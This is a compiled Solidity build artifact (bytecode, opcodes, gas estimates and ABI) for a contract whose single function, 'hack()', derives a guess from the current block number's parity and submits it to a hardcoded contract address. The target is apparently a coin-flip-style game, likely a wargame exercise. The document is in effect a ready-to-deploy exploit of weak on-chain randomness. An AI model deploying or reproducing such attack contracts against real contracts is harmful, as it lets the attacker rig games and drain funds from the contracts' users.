{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b506101d3806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80634de260a214610030575b600080fd5b61003861003a565b005b600043905060006001600283610050919061013d565b141561005f576001905061007a565b600060028361006e919061013d565b141561007957600090505b5b73688c0611a5691b7c1f09a694bf4adfb456a58cf773ffffffffffffffffffffffffffffffffffffffff166304412704826040518263ffffffff1660e01b81526004016100c7919061010c565b600060405180830381600087803b1580156100e157600080fd5b505af11580156100f5573d6000803e3d6000fd5b505050505050565b61010681610127565b82525050565b600060208201905061012160008301846100fd565b92915050565b60008115159050919050565b6000819050919050565b600061014882610133565b915061015383610133565b9250826101635761016261016e565b5b828206905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fdfea2646970667358221220671b623f55eff5749ac880c07d6e81dfd624384447e3901060657a9cb831b4b364736f6c63430008060033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1D3 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 NUMBER SWAP1 POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x2 DUP4 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13D JUMP JUMPDEST EQ ISZERO PUSH2 0x5F JUMPI PUSH1 0x1 SWAP1 POP PUSH2 0x7A JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP4 PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x13D JUMP JUMPDEST EQ ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 SWAP1 POP JUMPDEST JUMPDEST PUSH20 0x688C0611A5691B7C1F09A694BF4ADFB456A58CF7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4412704 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC7 SWAP2 SWAP1 PUSH2 0x10C JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0x106 DUP2 PUSH2 0x127 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x121 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x148 DUP3 PUSH2 0x133 JUMP JUMPDEST SWAP2 POP PUSH2 0x153 DUP4 PUSH2 0x133 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x163 JUMPI PUSH2 0x162 PUSH2 0x16E JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH8 0x1B623F55EFF5749A 0xC8 DUP1 0xC0 PUSH30 0x6E81DFD624384447E3901060657A9CB831B4B364736F6C63430008060033 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "93400",
				"executionCost": "141",
				"totalCost": "93541"
			},
			"external": {
				"hack()": "infinite"
			}
		},
		"methodIdentifiers": {
			"hack()": "4de260a2"
		}
	},
	"abi": [
		{
			"inputs": [],
			"name": "hack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}